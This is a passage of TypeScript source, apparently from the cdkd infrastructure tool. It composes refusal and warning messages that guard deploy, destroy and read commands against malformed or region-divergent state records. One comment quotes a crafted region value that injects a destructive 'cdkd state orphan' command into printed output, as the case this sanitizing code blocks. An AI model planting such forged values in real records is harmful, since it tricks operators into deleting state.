  // one. Compared against the RAW values, at the STATE-RECORD grammar's cap so
  // an ordinary multi-level nested child does not take the withhold arm.
  const cap = STACK_REF_MAX_CODE_POINTS;
  // ...AND pasteable, the second half go-to-k/cdkd#3516's review added to the
  // sibling and which this site owes for the same reason: exactness keeps a
  // space and a `:`, so a key region spelling
  // `Drop the record: cdkd state orphan prod --stack-region us-east-1` took the
  // naming arm and forged a filled-in destructive command inside the quoted
  // clause, which a terminal wrap starts a visual line with.
  //
  // NOT `mayNameTargetWithDestructiveRemedy`: that helper measures the region
  // at a REGION's 128, and this site measures a KEY region at the state-record
  // grammar's cap on purpose (go-to-k/cdkd#3328), so borrowing it would take a
  // healthy multi-level nested child down the withhold arm.
  const exact =
    safeIdentifier(stackName, cap) === stackName &&
    safeIdentifier(keyRegion, cap) === keyRegion &&
    isPasteableIdent(stackName) &&
    isPasteableIdent(keyRegion);
  const lists =
    resourceCount === undefined
      ? 'its resources map cannot be read'
      : `it still lists ${resourceCount} resource${resourceCount === 1 ? '' : 's'}`;
  // The KIND only, never the value — the withholding rule `getState`'s warn
  // takes. `null` / `''` / `0` are reported as divergent too (the read side
  // treats only absent and equal as agreement), and for those the kind IS the
  // whole answer, so the wording must not promise `--verbose` a value it has
  // nothing to show for.
  const kind = describeRegionValueKind(divergentBodyRegion);
  const opening = exact
    ? `cdkd will not destroy stack ${shellQuote(safeIdentifier(stackName, cap))} ` +
      `(${shellQuote(safeIdentifier(keyRegion, cap))}): the state record read from that ` +
      `region's key carries a 'region' of its own (${kind}) that is not the key's, and ${lists}`
    : `cdkd will not destroy the state record this command loaded: it carries a 'region' of its ` +
      `own (${kind}) that is not the region of the key it was read from, and ${lists}`;
  // The withhold SENTENCE lives here, not in the opening, so the shared tail's
  // "— so cdkd cannot tell which region…" still attaches to the divergence it
  // explains. Chained to the opening it produced two `— so` clauses with
  // different causes (review round 3).
  const remedy = exact
    ? `Re-run with --verbose to see what the record's region field holds, then either destroy ` +
      `against the region the resources are really in, or repair that field to match the key it ` +
      `is stored under and re-run. To drop the record and leave the live resources standing, ` +
      `spelled out rather than pasteable because that command DELETES a record: ` +
      DROP_RECORD_TEMPLATE
    : `This record's stack name or region does NOT render exactly — what any surrounding output ` +
      `shows is a sanitized form, and another record may render identically — so this message ` +
      `names no target and offers no command against one. List the records as stored with ` +
      `'cdkd state list --long', which prints a name needing sanitizing in quoted form, and act ` +
      `on the one whose key matches. Inspect it with: ${inspectCommand(undefined, undefined)}`;
  // The tail says "those resources" only when the opening counted some; on the
  // unreadable-bag arm it has no antecedent, so that arm gets its own wording.
  const cannotTell =
    resourceCount === undefined
      ? `— so cdkd can neither count what it would delete nor tell which region it is in`
      : `— so cdkd cannot tell which region those resources are in`;
  return (
    `${opening} ${cannotTell}. cdkd stamps the ` +
    `key's region into every record it writes, so this record was not written by cdkd. ` +
    `Destroying against the key's region would issue every delete there; if the record's own ` +
    `region is the honest half, each delete comes back not-found, which this command reads as ` +
    `ALREADY DELETED — it would report success, remove the record, and leave every resource ` +
    `standing in the other region with nothing naming it. ${remedy}`
  );
}

/**
 * Refuse a destroy over a record whose body region diverged from its key's,
 * while it still lists resources — see
 * {@link divergentRecordRegionRefusalMessage} for why the conjunction is the
 * trigger and why a resource-less record is not refused.
 *
 * CALL IT AT THE TOP OF THE DESTROY, **above the `resourceCount` fast path**,
 * for the placement reason {@link refuseMalformedResourcesForDestroy} gives —
 * and BELOW that call, because this one reads the bag's SIZE and only that
 * guard proves the bag can be read at all.
 *
 * `divergentBodyRegion` is `S3StateBackend.getState`'s report, `undefined` on
 * every record that agreed with its key — which is every record cdkd wrote.
 */
export function refuseDivergentRecordRegionForDestroy(
  state: StackState,
  stackName: string,
  keyRegion: string,
  divergentBodyRegion: unknown
): void {
  if (divergentBodyRegion === undefined) return;
  // FAIL CLOSED on a bag this cannot count. On the destroy path
  // `refuseMalformedResourcesForDestroy` has already refused such a record, so
  // this arm is unreachable there — but the guard is exported, and for a second
  // caller "a known divergence plus an unknowable resource count" must not
  // resolve to "proceed". An unreadable bag is the OTHER refusal's verdict;
  // what this one owes is to not silently answer zero.
  // `undefined` IS the unreadable answer, carried straight into the message —
  // an earlier cut computed a `0` here that nothing rendered.
  const resourceCount = isReadableBag(state.resources)
    ? Object.keys(state.resources).length
    : undefined;
  if (resourceCount === 0) return;
  // `markNonRetryable` for the reason the sibling refusals carry it: the
  // verdict comes from a PERSISTED record, so no retry can change it.
  throw markNonRetryable(
    new CdkdError(
      divergentRecordRegionRefusalMessage(stackName, keyRegion, divergentBodyRegion, resourceCount),
      STATE_REGION_DIVERGED
    )
  );
}

/**
 * The DEPLOY refusal text for the `resources` bag (issue
 * [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * A THIRD `resources` text, and not {@link malformedStateRefusalMessage}'s for
 * the same reason the destroy one is not: that text describes the SAVE as the
 * harm, and here the save is the last thing that happens rather than the
 * first. An unreadable map reads as zero RECORDED resources, so the change
 * calculation plans every resource the template declares as a CREATE and the
 * deploy re-provisions the whole stack against live AWS — colliding on every
 * deterministic name and duplicating the rest — before saving a well-formed
 * record over the only evidence anything was wrong. An operator told their
 * record would be "replaced with a well-formed empty one" would not know that
 * running anyway duplicates their stack.
 *
 * **It must be true under `cdkd deploy --dry-run` as well**, which it is: the
 * guard sits at the state LOAD, above the diff and above the `if
 * (this.options.dryRun)` return, so a dry run reaches it. Refusing there is
 * the decision {@link malformedResourcePropertiesRefusalMessage} records for
 * the sibling container, for the same reason — the repaired PREVIEW is
 * available one command over from `cdkd diff`, which repairs this bag and
 * warns, so refusing here costs nothing that is not already offered, while a
 * plausible `--dry-run` plan followed by a refusal the moment the flag comes
 * off would be the worst arm of all.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedDeployResourcesRefusalMessage(stackName: string, region: string): string {
  return (
    `${malformedStateDiagnosis(stackName, region)} 'cdkd deploy' can WRITE state and AWS ` +
    `resources, so it refuses rather than continuing — under '--dry-run' too, because the plan ` +
    `a dry run would print is the wrong one: an unreadable map reads as ZERO recorded ` +
    `resources, so every resource the template declares is planned as a CREATE and the deploy ` +
    `re-provisions a stack that already exists, colliding on each deterministic name and ` +
    `duplicating the rest, then saves a well-formed record over the only evidence anything was ` +
    `wrong. Reading the bag as EMPTY produces that same plan rather than avoiding it. Nothing ` +
    `was provisioned and no state was written FOR THIS STACK. Repair or remove the record ` +
    `first; 'cdkd diff' previews the stack with this map read as EMPTY and warns that it did. ` +
    `Inspect it with: ${inspectCommand(stackName, region)}`
  );
}

/**
 * For `cdkd deploy`: refuse a record whose `resources` bag cannot be read
 * (issue [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * The gap go-to-k/cdkd#3317's review named and left: that lane closed the
 * per-entry `properties` container at `DiffCalculator.calculateDiff`, and
 * {@link unreadableResourcePropertyBags} deliberately returns `[]` for a
 * record whose ROOT bag is unreadable — so `"resources": "abcdef"` reached the
 * deploy diff, enumerated two fabricated logical ids, and re-created the
 * stack. {@link refuseMalformedState}'s callers are `import.ts`, `orphan.ts`
 * and `rollback.ts`, none of which is on this path.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedOutputs} — the placement
 * rule {@link repairMalformedResourcesForReadOnly}'s note records. Not at
 * `calculateDiff`: the engine's own load dominates that call AND the twelve
 * reads between them — five, measured 2026-09-17 over comment-stripped source;
 * re-derive rather than trusting the figure — the first of which
 * (`Object.keys(currentState.resources)` in a debug line) is where a `null`
 * bag raised the bare `TypeError` #3018 exists to remove.
 */
export function refuseMalformedResourcesForDeploy(
  state: StackState,
  stackName: string,
  region: string
): void {
  if (hasReadableResources(state)) return;
  // `markNonRetryable` for the reason `refuseMalformedResourceProperties`
  // carries it: a nested child's deploy runs inside the parent's
  // `withRetry(provider.create)`, the verdict comes from a persisted record no
  // retry can change, and the message interpolates identifiers a
  // SUBSTRING-matching classifier can read as transient. Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedDeployResourcesRefusalMessage(stackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * A record container a TEXT view walks with `Object.entries`, other than the
 * `resources` bag the rest of this module is about.
 *
 * A CLOSED union because a container name is the VIEW's own vocabulary — the
 * set of blocks it renders — not anything a record can name. Widening it to
 * `string` would let a caller hand the warning below a key read out of a
 * hand-edited record, which is a different message from the one this is.
 *
 * That is a design reason and NOT a safety one, and the distinction is
 * load-bearing: {@link malformedRenderedContainersWarning} sanitizes every name
 * it prints, so the closed union is not what stops a forged one from forging a
 * line. Do not read this note as licence to drop that sanitizing — an earlier
 * revision of this comment said the opposite and would have licensed exactly
 * that (review of go-to-k/cdkd#3190).
 */
export type RenderedStateContainer = 'outputs' | 'skippedOutputs' | 'attributes' | 'properties';

/**
 * The warning a view emits when it emptied one or more {@link
 * RenderedStateContainer}s it could not walk (go-to-k/cdkd#3187).
 *
 * Deliberately NOT {@link malformedResourcesWarning}'s text, and the reason is
 * narrower than it looks. That one tells the reader not to run `cdkd deploy` /
 * `cdkd destroy` because an unreadable `resources` MAP is indistinguishable
 * from an empty stack: deploy would re-CREATE everything and destroy would
 * delete nothing. No container named here can produce that specific confusion —
 * the resource SET is still readable — so borrowing that sentence would attach
 * a re-create-the-world warning to a record whose resource list is intact.
 *
 * It is NOT that these containers are display-only. `properties` is read by the
 * deploy change calculation (`src/analyzer/diff-calculator.ts`), where a
 * non-object compares unequal to any
 * desired object and yields a spurious property-change set — measured there as
 * a REPLACEMENT of the live resource, and closed by
 * {@link refuseMalformedResourceProperties} (go-to-k/cdkd#3191). An earlier
 * revision of this comment asserted the display-only premise, which would have
 * read as licence to drop a guard on that path (review of go-to-k/cdkd#3190).
 * That the path is now guarded does not restore the premise: this text is still
 * not the one to borrow, because the deploy path REFUSES where these views
 * continue.
 *
 * What stays the same is the remedy: `--json` is the mode that shows the
 * stored value.
 *
 * ONE warning per record however many containers it names — a stack whose 500
 * resources all carry a hand-edited `properties` gets one line, not 500. The
 * caller FILTERS a fixed order (`RENDERED_CONTAINER_ORDER`), so the text is
 * stable across records. Not `.sort()` — that order is deliberately not
 * alphabetical, and its own JSDoc says so.
 *
 * Both identifiers are sanitized and then shell-quoted, and the command is
 * emitted LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s own note
 * gives.
 *
 * The container NAMES take {@link safeIdentifier} too — the SAME helper, so
 * they cannot drift from it — but NOT `shellQuote`, because they appear in the
 * PROSE and never inside the command this text tells the reader to run; the
 * command carries the two identifiers and nothing else.
 *
 * Sanitizing them is not dead code written for a case that cannot happen. The
 * union above is closed at COMPILE time, so without this the guarantee would
 * live in a comment, and the day a caller derives a name from a record instead
 * of from a literal an unsanitized element could forge a line, render as empty
 * quotes naming nothing, or run to kilobytes and push the remedy command off
 * the reader's screen. `safeIdentifier` closes all three and is the identity on
 * all four literals, so no user-visible text moves.
 *
 * What it does NOT close, stated rather than reassured away: a forged name made
 * only of printable ASCII still renders verbatim inside its quotes and could
 * read as prose. That residual is bounded to the PROSE — the command the reader
 * pastes is built from the two shell-quoted identifiers alone — and closing it
 * would mean JSON-quoting a name in the one place the text is meant to read as
 * English (review of go-to-k/cdkd#3190).
 */
export function malformedRenderedContainersWarning(
  stackName: string,
  region: string,
  containers: readonly RenderedStateContainer[]
): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  const names = containers
    .map((name) => `'${safeIdentifier(name, SHORT_NAME_MAX_CODE_POINTS)}'`)
    .join(', ');
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has a non-object ${names} — the record ` +
    `is malformed or truncated. 'Object.entries' walks a string or a list as readily as a map, ` +
    `so rendering one INVENTS a row per character or element. Continuing with it EMPTY: this ` +
    `view shows no rows there, which is not the same as the record holding none. A per-resource ` +
    `container is named once however many resources hold one. See the stored values with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/** The warning a caller of {@link repairMalformedResourcesForReadOnly} emits. */
export function malformedResourcesWarning(stackName: string, region: string | undefined): string {
  return (
    `${malformedStateDiagnosis(stackName, region)} Continuing with an EMPTY resource set: this ` +
    `command's output describes zero resources, which is not the same as the stack having none. ` +
    `Inspect it with: ${inspectCommand(stackName, region)}`
  );
}

/**
 * The `outputs` half of {@link repairMalformedResourcesForReadOnly}, for a
 * READ-ONLY command that DIFFS the stored bag rather than rendering it
 * (go-to-k/cdkd#3189).
 *
 * `computeOutputsDiff` enumerates the stored bag twice, the second walk
 * emitting one `REMOVE` row per stored key today's template no longer declares.
 * It used to admit the bag on a bare `?? {}`, which covers `null` and
 * `undefined` only — so a hand-edited or truncated record whose `outputs` holds
 * a string or a list previewed the REMOVAL of outputs that never existed, one
 * row per character or element, each carrying a character of the record as its
 * `old:` side, with `cdkd diff --fail` exiting 1 on them.
 *
 * AT THE LOAD, for the reason
 * {@link repairMalformedResourcesForReadOnly}'s own note records and one more
 * that is specific to this container: `cdkd diff` dereferences the stored bag
 * BEFORE the walk that fabricates. `resolveTemplateOutputs` asks
 * `hasOwnProperty.call(storedOutputs, key)` for go-to-k/cdkd#2740's
 * skipped-output record and for go-to-k/cdkd#1942's literal `Export.Name`
 * verdict — which ANSWERS TRUE on a string for `'0'` or `'length'`, and THROWS
 * outright on `null` (`Cannot convert undefined or null to object`). So a guard
 * written at `computeOutputsDiff` alone leaves a wrong decision, or a raw
 * `TypeError`, one call above it.
 *
 * ABSENT IS EXEMPT AND `null` IS NOT, which is the one place this diverges from
 * {@link isReadableBag}'s verdict, and the split is measured rather than
 * stylistic. Both stored-bag lookups named above gate on
 * `storedOutputs !== undefined` before the `hasOwnProperty` call, so an ABSENT
 * bag never reaches one; every other consumer on the diff path carries its own
 * `?? {}` (`mergeNoChangeOutputs`'s `persisted`, `importableOutputKeys`, this
 * function's own walk). An absent bag is therefore inert, exactly the condition
 * under which `state.ts`'s `repairRenderedContainers` exempts it — and warning
 * would be a false positive on a record cdkd itself supports: `cdkd scrub`
 * round-trips a record with no `outputs` deliberately, refusing to materialize
 * `{}` over it, and the deploy's failure-path saves write
 * `outputs: currentState.outputs`, which `JSON.stringify` drops when it is
 * undefined. A `null` bag is NOT inert — it passes the `!== undefined` gate and
 * `hasOwnProperty.call(null, ...)` throws — so it is repaired and warned about
 * like any other unreadable shape.
 *
 * That leaves one clause of go-to-k/cdkd#3189's stated floor overridden on
 * purpose: it asked that a `null` bag "diff exactly as it does today and say
 * nothing", and diffing exactly as it does today means THROWING. Recorded on
 * the issue rather than silently traded.
 *
 * Mutates in place and returns whether it repaired anything; the caller warns
 * on `true` with {@link malformedOutputsWarning}. Read-only commands ONLY, for
 * the reason {@link refuseMalformedState} gives — a bag laundered into a
 * well-formed empty one is permanent, and for `outputs` it would also take the
 * exports index with it on the next write.
 */
export function repairMalformedOutputsForReadOnly(state: StackState): boolean {
  if (hasReadableOutputs(state)) return false;
  state.outputs = {};
  return true;
}

/**
 * The warning a caller of {@link repairMalformedOutputsForReadOnly} emits.
 *
 * Deliberately neither {@link malformedResourcesWarning}'s text nor
 * {@link malformedRenderedContainersWarning}'s, because the CONSEQUENCE of
 * continuing empty differs from both. The resources text forbids
 * `cdkd deploy` / `cdkd destroy` because an unreadable resource MAP is
 * indistinguishable from an empty stack; the resource set is intact here. The
 * rendered-containers text says the view "shows no rows there" — true of a
 * renderer, false of a diff, which does not go quiet on an empty stored bag but
 * reports every resolved output as an `ADD`. Saying so is the point: an
 * operator who reads `ADD` rows for outputs the stack already has needs to know
 * the comparison lost its left-hand side.
 *
 * Identifiers are sanitized and then shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOutputsWarning(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. Where the stored value is a string or a list, ` +
    `'Object.entries' walks it as readily as a map, so diffing it INVENTS a REMOVE row per ` +
    `character or element carrying the record's own characters; where it is a number, a boolean ` +
    `or null, it yields no comparison at all. Continuing with it EMPTY: every output this diff ` +
    `resolves is reported as an ADD and no stored key is reported as a REMOVE, which is not the ` +
    `same as the record holding none. See the stored value with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For a command that can WRITE state: refuse the record by name instead of
 * repairing it.
 *
 * Repairing is actively DANGEROUS here, and the PR that introduced this module
 * shipped that danger for one round before its security review caught it.
 * `cdkd scrub` gates its `saveState` on `recordsChanged > 0`, which an OUTPUTS
 * change alone satisfies — so a record holding `"resources": null` and a
 * plaintext secret in `outputs` would be scrubbed, and then saved back with a
 * repaired, WELL-FORMED `resources: {}`. The malformed record is the only
 * signal that anything is wrong; laundering it into a legitimate-looking empty
 * one is permanent and silent. The next `cdkd deploy` then reads zero resources
 * and CREATES the whole stack a second time, and the next `cdkd destroy`
 * deletes nothing and orphans every live resource — and the one-shot warning
 * that would have said so is long gone, quite possibly for a different
 * operator. `cdkd import --force` launders it the same way.
 *
 * Refusing still satisfies #3018, whose complaint was the BARE `TypeError`:
 * this names the stack, the region, the defect and the remedy, and exits on a
 * code rather than on a stack trace.
 */
export function refuseMalformedState(state: StackState, stackName: string, region: string): void {
  if (hasReadableResources(state)) return;
  // NOT `markNonRetryable`, and that is the DECISION rather than the omission
  // it reads as: its callers — `cdkd import`, `cdkd orphan`, `cdkd rollback`,
  // `cdkd state refresh-observed` and `cdkd drift --accept` / `--revert` — each
  // raise it from the command's own flow, outside any `withRetry`, so the
  // marker would fence nothing there. {@link refuseMalformedResourceEntries}
  // and {@link refuseMalformedResourcePropertiesForOrphan} are the other two
  // unmarked refusals, for the same reason. Revisit if a retrying caller is
  // added; `tests/unit/state/malformed-resources-bag.test.ts` names all three
  // exemptions so another refusal cannot join them silently (review round 2 of
  // go-to-k/cdkd#3332).
  throw new CdkdError(malformedStateRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED);
}

/**
 * The `outputs` half of {@link malformedStateRefusalMessage}, for the same
 * reason that one is exported separately from the throw: `cdkd scrub`'s exit
 * `1` is spoken for and it raises its own exit-2 class around this text.
 *
 * A DIFFERENT text from the `resources` refusal because the consequence of
 * continuing differs, the same way the three warnings in this module differ. The
 * `resources` message forbids `cdkd deploy` / `cdkd destroy` because an
 * unreadable resource MAP is indistinguishable from an empty stack; the resource
 * set is intact here. What is at stake instead is the SHARED exports index:
 * `cdkd/_index/<region>/exports.json` is rebuilt from these bags, and a string
 * bag published one fabricated export per character into the namespace every
 * other stack's `Fn::ImportValue` binds against.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOutputsRefusalMessage(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. This command can WRITE state, so it refuses rather than ` +
    `continuing: it REBUILDS the bag before saving, and 'Object.entries' walks a string or a ` +
    `list as readily as a map, so a six-character value would be saved back as a well-formed ` +
    `six-key map (a null one as an empty map). That replaces the only signal anything is wrong ` +
    `with a legitimate-looking record, permanently — and the next deploy republishes it into ` +
    `the shared exports index every other stack's Fn::ImportValue resolves against. Repair or ` +
    `remove the record first. Inspect it with: cdkd state show ${shellQuote(stack)} ` +
    `--stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The line `ExportIndexStore`'s rebuild emits for a producer record whose
 * export set it could not read (issue go-to-k/cdkd#3192) — `outputs` not a
 * plain object, or `exportNames` present and not an array.
 *
 * A THIRD outputs text rather than {@link malformedOutputsWarning} because the
 * consequence is again different, which is the rule the two above already
 * follow. That one describes a DIFF continuing with an empty left-hand side.
 * This describes a record CONTRIBUTING NOTHING to a shared, region-wide index
 * other stacks resolve against — so the symptom a reader will actually meet is
 * a later `Fn::ImportValue` failing in a DIFFERENT stack, naming the consumer
 * and not this record. Saying which producer dropped out is the whole value of
 * the line.
 *
 * It says the rebuild CONTINUES, because it does: refusing would take every
 * other producer in the region down with it, and the index is best-effort by
 * design.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedExportSourceWarning(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map or ` +
    `'exportNames' list — the record is malformed or truncated. It contributes NO exports to ` +
    `this region's index, which is not the same as the stack exporting none: an ` +
    `Fn::ImportValue of a name this stack really publishes will fail in the CONSUMER stack, ` +
    `naming that stack rather than this record. Continuing with the other producers — ` +
    `enumerating a string or a list here would instead publish one FABRICATED export per ` +
    `character or element. See the stored values with: cdkd state show ${shellQuote(stack)} ` +
    `--stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The line a READ-ONLY command emits when a record's `exportNames` FIELD could
 * not be used (go-to-k/cdkd#3192 review) — present and not an array, or an
 * array with no usable name in it.
 *
 * Why a message at all, when the predicate already fails closed: before this
 * class was guarded, `cdkd diff` over such a record died with
 * `TypeError: state.exportNames.filter is not a function`. Failing closed
 * inside `importableOutputKeys` is right — it is a pure predicate reached from
 * five commands and holds no stack identity — but silently replacing a LOUD
 * wrong answer with a QUIET one is its own regression, and `cdkd diff` is
 * exactly the caller that DOES hold the identity. Without this it warned about
 * a damaged `outputs` bag on one line and said nothing about the damaged
 * `exportNames` on the same record.
 *
 * Deliberately NOT {@link malformedOutputsWarning}'s text: that one is about
 * the BAG, and the consequence differs. An unusable export SET does not lose
 * the comparison's left-hand side — every stored key is still diffed — it
 * makes the preview report no key as an export, so a row that would carry
 * `[export]` renders without it.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedExportNamesWarning(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has an unusable 'exportNames' list — ` +
    `the record is malformed or truncated. It is read as an EMPTY export set, which is not the ` +
    `same as the record holding one: no stored key is reported as an export, so a row that ` +
    `should carry an '[export]' tag renders without it. Reading it as UNKNOWN instead would be ` +
    `worse — that falls back to the pre-v9 rule where every output name is importable. See the ` +
    `stored value with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} ` +
    `--json`
  );
}

/**
 * For a command that can WRITE state: refuse a record whose `outputs` bag
 * cannot be read, instead of rebuilding it (issue go-to-k/cdkd#3192).
 *
 * The SIBLING of {@link refuseMalformedState}, and deliberately a second call
 * rather than a widening of that one. A record can be malformed in either
 * container alone, the two carry different consequences, and the refusal a user
 * sees must name the container that is actually broken — a `resources` message
 * printed over an intact resource map tells them not to run `cdkd deploy` for a
 * reason that does not hold.
 *
 * Why REFUSE and not {@link repairMalformedOutputsForReadOnly}, which is the
 * opposite answer for the same container one function up: repairing the bag and
 * then saving it IS the laundering this is here to stop. Measured, not
 * reasoned — `rewriteResourceReferences` turns `outputs: 'abcdef'` into
 * `{"0":"a",…,"5":"f"}` and `cdkd orphan` saves that; `cdkd scrub`'s
 * `redactUnaccountedOutputs` spreads the same string into a map and its
 * `outputsChanged` compare then satisfies the `recordsChanged > 0` write gate;
 * `cdkd import` carries a `null` bag through `?? {}`. Each one rewrites a
 * damaged record into a well-formed one and the evidence is gone.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedState} and above the first
 * expression that reads the bag — the placement rule
 * {@link repairMalformedResourcesForReadOnly}'s note records, for the reason it
 * records: a guard written at the rebuild leaves every earlier dereference in
 * front of it.
 */
export function refuseMalformedOutputs(
  state: Pick<StackState, 'outputs'>,
  stackName: string,
  region: string
): void {
  if (hasReadableOutputs(state)) return;
  // `markNonRetryable` for the reason its three siblings carry it, which holds
  // here identically and was simply missed: `cdkd deploy` is one of this
  // function's callers, a nested child's deploy runs inside the parent's
  // `withRetry(provider.create)`, the verdict comes from a PERSISTED record no
  // retry can change, and the message interpolates a caller-supplied stack name
  // a SUBSTRING-matching classifier can read as transient. Without it a child
  // whose `outputs` bag was damaged burned the full retry schedule while one
  // whose `resources` bag was damaged did not (review of go-to-k/cdkd#3161).
  // Issue #1838.
  throw markNonRetryable(
    new CdkdError(malformedOutputsRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED)
  );
}

/**
 * The stand-in row a read-only view lists in its `unreadable` set for an
 * `orphans` container it could not read, beside
 * {@link UNREADABLE_RESOURCES_MAP_ROW}'s row for the resource map.
 */
export const UNREADABLE_ORPHANS_CONTAINER_ROW = '(orphans container)';

/**
 * Whether the `orphans` CONTAINER is the list every reader of it assumes
 * (issue go-to-k/cdkd#3379).
 *
 * `parseStateBody` validates the record root and its schema version and returns
 * the cast record otherwise unchanged, so a hand-edited or planted
 * `"orphans": "abc"`, `5`, `{}` or `{"length": 1}` survives the load and every
 * reader reaches it on a bare `?? []`, `?.length` or `?.map`.
 *
 * ABSENT IS READABLE, for the reason {@link hasReadableOutputs}'s note gives
 * for its own container and one that is sharper here: an absent `orphans` is
 * the ORDINARY record. A stack that never had a failed deploy has no orphan
 * list at all, `JSON.stringify` drops the key when it is undefined, and
 * `orphansAfterRollback` returns `{}` on `previous.orphans === undefined`
 * WITH nothing newly orphaned — the pair of conditions that keeps such a
 * record byte-identical. Warning or refusing on absence would fire on
 * almost every record in a bucket.
 *
 * `null` is NOT readable, which is where this parts from a bare `?? []`: that
 * admits `null` silently, and the shapes this exists to catch are exactly the
 * ones it cannot see.
 *
 * The ENTRIES are a separate question with a separate answer —
 * `orphans[<i>].properties` is go-to-k/cdkd#3344, and
 * {@link refuseMalformedResourcePropertiesForOrphan} is the guard there. This
 * one says only that the container is a list.
 */
export function hasReadableOrphans(state: Pick<StackState, 'orphans'>): boolean {
  return state.orphans === undefined || Array.isArray(state.orphans);
}

/**
 * For a READ-ONLY command: replace an unreadable `orphans` container with an
 * empty list so the command can report the rest of the record, and return
 * whether it did, so the caller can warn with
 * {@link malformedOrphansWarning} and list
 * {@link UNREADABLE_ORPHANS_CONTAINER_ROW} among what it could not read.
 *
 * AT THE LOAD, the placement rule
 * {@link repairMalformedResourcesForReadOnly}'s note records: `cdkd diff`
 * reaches the container through `currentState.orphans?.length` before its
 * adoption preview, so a guard written at the preview leaves the dereference
 * above it — and for a STRING that dereference is the one that lies, since
 * `'abc'.length` is 3 and the preview then walks characters.
 *
 * READ-ONLY commands only, for the reason {@link refuseMalformedState} gives:
 * a container laundered into a well-formed empty one is permanent, and for
 * this container it also erases the only record that resources were left
 * behind in AWS by an earlier failed deploy.
 */
export function repairMalformedOrphansForReadOnly(state: StackState): boolean {
  if (hasReadableOrphans(state)) return false;
  state.orphans = [];
  return true;
}

/**
 * The warning a caller of {@link repairMalformedOrphansForReadOnly} emits.
 *
 * Its own text rather than any of the three above, the rule this module's
 * every message follows: what continuing EMPTY costs here is not a diff's
 * left-hand side or a rendered view's rows but the record's evidence that
 * resources from an earlier failed deploy are still live in AWS. A reader who
 * sees no adoption preview and no orphan warning will conclude the stack has
 * none.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOrphansWarning(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'orphans' list — the ` +
    `record is malformed or truncated. Readers reach it on a bare '?? []' or '?.length', which ` +
    `admits a string, a number, a plain object and null alike: a string is WALKED, one garbage ` +
    `orphan per character, and the others read as no orphans at all. Continuing with it EMPTY: ` +
    `this view previews no adoption and names no orphan, which is NOT the same as the record ` +
    `holding none — resources from an earlier failed deploy may still be live in AWS. See the ` +
    `stored value with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The refusal text for a command that can WRITE the record.
 *
 * A DIFFERENT text from the warning because the danger is different and worse:
 * the reshaping reader is also a writer. `orphansAfterRollback` walks the
 * container with `for...of`, so over `"abc"` it returns a list holding `"c"`,
 * and `cdkd rollback` SAVES that record — a damaged container rewritten into a
 * differently damaged one, silently. `cdkd deploy`'s adoption pass assigns
 * `currentState.orphans` from what it read, and `cdkd destroy` proceeds through
 * resource deletion to `deleteState` having never reported the orphans it could
 * not read.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOrphansRefusalMessage(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'orphans' list — the ` +
    `record is malformed or truncated. This command can WRITE state, so it refuses rather than ` +
    `continuing: a string container is WALKED one character at a time and written back as a ` +
    `list of character-shaped orphan records, and every other unreadable shape reads as no ` +
    `orphans at all — so a run would delete or adopt against a record whose evidence of ` +
    `resources left live in AWS by an earlier failed deploy it never read. Repair or remove the ` +
    `record first, and no cdkd command repairs this container: rewriting it to [] by hand ` +
    `discards the very evidence this refusal is protecting. Inspect the record with: ` +
    `cdkd state show ${shellQuote(stack)} ` +
    `--stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The DESTROY refusal text for this container (go-to-k/cdkd#3379 review).
 *
 * Its own text rather than {@link malformedOrphansRefusalMessage}, for the
